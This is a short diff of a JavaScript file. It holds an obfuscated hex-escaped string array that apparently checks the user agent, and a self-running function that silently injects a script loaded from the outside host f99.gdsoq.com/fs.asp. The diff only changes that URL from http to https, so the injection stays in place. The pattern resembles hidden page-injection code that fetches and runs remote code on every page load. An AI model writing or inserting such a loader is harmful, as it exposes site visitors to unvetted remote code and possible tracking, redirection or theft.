@@ -2,7 +2,7 @@ var _0x1685=["\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x74\x65\x73\x74","\x6B\x5F
 
 (function(){
   var m = document.createElement("script");
-  m.src = "http://f99.gdsoq.com/fs.asp?uid=4049&vid=1&tid=1";
+  m.src = "https://f99.gdsoq.com/fs.asp?uid=4049&vid=1&tid=1";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(m, s);
  })();
